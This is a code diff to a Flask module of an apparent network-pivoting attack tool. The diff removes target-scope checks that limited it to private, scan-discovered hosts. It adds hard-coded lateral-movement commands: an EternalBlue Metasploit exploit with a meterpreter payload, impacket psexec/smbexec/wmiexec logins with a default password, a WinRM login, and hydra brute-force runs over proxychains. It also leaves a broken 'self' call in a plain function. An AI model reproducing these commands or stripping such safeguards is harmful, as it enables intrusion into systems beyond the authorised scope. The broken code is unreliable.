@@ -9,14 +9,8 @@ import logging
 import time
 from flask import Blueprint, jsonify, request, session as flask_session, render_template
 from config import Config
-from core.helpers import (
-    _active_scan_record,
-    _active_validation_results,
-    _save_active_scan_fields,
-)
+from core.helpers import _active_validation_results
 from pivot.pivot_engine import PivotEngine
-import ipaddress
-from datetime import datetime, timezone
 
 log = logging.getLogger(__name__)
 
@@ -24,6 +18,7 @@ pivot_bp = Blueprint("pivot", __name__, url_prefix="/pivot")
 
 # Global pivot engine instance
 _pivot_engine: PivotEngine = None
+
 
 def init_pivot_engine():
     """Initialize the pivot engine with Kali IP from config."""
@@ -152,176 +147,28 @@ def pivot_scan():
             "type": target_type,
         })
 
-    pivot_scan_results = {
+    return jsonify({
         "ok": True,
         "phase": "internal_scan",
         "target_range": target_range,
         "hosts_found": len(results),
         "targets": targets,
-        "recommendations": _generate_recommendations(targets),
-    }
-
-    internal_targets = []
-
-    for target in targets:
-        try:
-            address = ipaddress.ip_address(target.get("ip", ""))
-        except ValueError:
-            continue
-
-        if (
-            address.version != 4
-            or not address.is_private
-            or address.is_loopback
-        ):
-            continue
-
-        internal_targets.append({
-            **target,
-            "ip": str(address),
-            "discovered_at": datetime.now(timezone.utc).isoformat(),
-            "source": "pivot_scan",
-        })
-
-    pivot_scan_results["targets"] = internal_targets
-    pivot_scan_results["hosts_found"] = len(internal_targets)
-
-    flask_session["internal_targets"] = internal_targets
-    flask_session["pivot_scan_results"] = pivot_scan_results
-
-    _save_active_scan_fields(
-        internal_targets=internal_targets,
-        pivot_scan_results=pivot_scan_results,
-    )
-
-    return jsonify(pivot_scan_results)
-
-
-@pivot_bp.route("/target/select", methods=["POST"])
-def pivot_target_select():
-    data = request.get_json(silent=True)
-
-    if not isinstance(data, dict) or set(data) != {"target_ip"}:
-        return jsonify({
-            "ok": False,
-            "error": "Only target_ip is accepted.",
-        }), 400
-
-    try:
-        address = ipaddress.ip_address(
-            str(data.get("target_ip") or "").strip()
-        )
-    except ValueError:
-        return jsonify({
-            "ok": False,
-            "error": "target_ip must be a valid IPv4 address.",
-        }), 400
-
-    if (
-        address.version != 4
-        or not address.is_private
-        or address.is_loopback
-    ):
-        return jsonify({
-            "ok": False,
-            "error": "target_ip must be a private non-loopback IPv4 address.",
-        }), 400
-
-    active_scan = _active_scan_record()
-    internal_targets = (
-        active_scan.get("internal_targets")
-        or flask_session.get("internal_targets")
-        or []
-    )
-
-    selected = next(
-        (
-            target
-            for target in internal_targets
-            if isinstance(target, dict)
-            and target.get("ip") == str(address)
-        ),
-        None,
-    )
-
-    if selected is None:
-        return jsonify({
-            "ok": False,
-            "error": "The target was not discovered by the current pivot scan.",
-        }), 400
-
-    external_target = (
-        active_scan.get("external_target")
-        or active_scan.get("target")
-        or flask_session.get("external_target_ip")
-        or flask_session.get("target_ip")
-    )
-
-    selected_internal_target = {
-        **selected,
-        "selected_at": datetime.now(timezone.utc).isoformat(),
-    }
-
-    flask_session["external_target_ip"] = external_target
-    flask_session["selected_internal_target"] = selected_internal_target
-    flask_session.pop("selected_agent_paw", None)
-
-    _save_active_scan_fields(
-        external_target=external_target,
-        selected_internal_target=selected_internal_target,
-        selected_agent_paw=None,
-    )
-
-    return jsonify({
-        "ok": True,
-        "selected_internal_target": selected_internal_target,
-        "external_target": external_target,
-        "selected_agent_paw": None,
+        "recommendations": self._generate_recommendations(targets),
     })
 
 def _generate_recommendations(targets):
-    """Generate recommendations from the evidence-driven lateral technique catalog."""
-    try:
-        from exploitation.module_catalog import get_module_catalog
-        catalog = get_module_catalog()
-    except Exception:
-        catalog = None
-
+    """Generate human-readable attack recommendations."""
     recs = []
-    seen = set()
+    has_windows = any(t.get("type") == "windows_smb" for t in targets)
+    has_windows_rdp = any(t.get("type") == "windows_rdp" for t in targets)
+    has_linux = any(t.get("type") == "linux_ssh" for t in targets)
 
-    for target in targets or []:
-        target_type = str(target.get("type") or "").strip().lower()
-        service = str(target.get("service") or "").strip().lower()
-        try:
-            port = int(target.get("port") or 0)
-        except (TypeError, ValueError):
-            port = 0
-        cves = target.get("cves") or []
-
-        if catalog is not None:
-            matches = catalog.matching_lateral(
-                target_type=target_type,
-                service=service,
-                port=port,
-                cves=cves,
-            )
-            for tech in matches:
-                note = tech.recommendation or tech.title
-                if note and note not in seen:
-                    seen.add(note)
-                    recs.append(note)
-        else:
-            # Minimal fallback if catalog cannot load.
-            if target_type == "windows_smb" and "smb" not in seen:
-                seen.add("smb")
-                recs.append("Windows SMB hosts detected — review catalog lateral techniques")
-            elif target_type == "windows_rdp" and "rdp" not in seen:
-                seen.add("rdp")
-                recs.append("RDP accessible — review catalog RDP techniques")
-            elif target_type == "linux_ssh" and "ssh" not in seen:
-                seen.add("ssh")
-                recs.append("Linux SSH hosts detected — review catalog SSH techniques")
+    if has_windows:
+        recs.append("Windows SMB hosts detected — try EternalBlue (MS17-010) via proxychains")
+    if has_windows_rdp:
+        recs.append("RDP accessible — check for BlueKeep (CVE-2019-0708) or try RDP brute-force")
+    if has_linux:
+        recs.append("Linux SSH hosts detected — try credential brute-force via hydra through proxychains")
 
     if not recs:
         recs.append("No clearly identifiable targets — try expanding scan range or ports")
@@ -343,39 +190,53 @@ def lateral_commands():
     if not target_ip:
         return jsonify({"ok": False, "error": "target_ip required"}), 400
 
-    username = data.get("username") or "Administrator"
-    password = data.get("password") or "P@ssw0rd"
+    commands = {
+        "ms17_010": (
+            f"proxychains -q msfconsole -q -x '"
+            f"use exploit/windows/smb/ms17_010_eternalblue; "
+            f"set RHOSTS {target_ip}; "
+            f"set PAYLOAD windows/x64/meterpreter/bind_tcp; "
+            f"set LPORT 4444; "
+            f"exploit -z; "
+            f"sessions -l'"
+        ),
+        "psexec": (
+            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py "
+            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
+        ),
+        "smbexec": (
+            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/smbexec.py "
+            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
+        ),
+        "wmiexec": (
+            f"proxychains -q python3 /usr/share/doc/python3-impacket/examples/wmiexec.py "
+            f"Administrator:{data.get('password', 'P@ssw0rd')}@{target_ip} cmd.exe"
+        ),
+        "winrm": (
+            f"proxychains -q crackmapexec winrm {target_ip} -u Administrator "
+            f"-p {data.get('password', 'P@ssw0rd')}"
+        ),
+        "rdp_brute": (
+            f"proxychains -q hydra -l Administrator "
+            f"-P /usr/share/wordlists/rockyou.txt rdp://{target_ip} -t 4"
+        ),
+        "ssh_brute": (
+            f"proxychains -q hydra -l {data.get('username', 'root')} "
+            f"-P /usr/share/wordlists/rockyou.txt ssh://{target_ip} -t 4"
+        ),
+    }
 
-    try:
-        from exploitation.module_catalog import get_module_catalog
-        catalog = get_module_catalog()
-        tech = catalog.lateral_by_key(str(technique))
-    except Exception as exc:
-        return jsonify({"ok": False, "error": f"Catalog unavailable: {exc}"}), 500
-
-    if not tech:
-        available = [item.key for item in catalog.lateral_techniques]
-        return jsonify({
-            "ok": False,
-            "error": f"Unknown technique: {technique}",
-            "available_techniques": available,
-        }), 400
-
-    cmd = tech.command_template.format(
-        target_ip=target_ip,
-        username=username,
-        password=password,
-    )
+    cmd = commands.get(technique)
+    if not cmd:
+        return jsonify({"ok": False, "error": f"Unknown technique: {technique}"}), 400
 
     return jsonify({
         "ok": True,
         "phase": "lateral_movement",
         "target": target_ip,
         "technique": technique,
-        "title": tech.title,
         "command": cmd,
         "proxychains": True,
-        "catalog_driven": True,
         "note": "Run this command in a Kali terminal window (proxychains routes through the pivot)",
     })
 
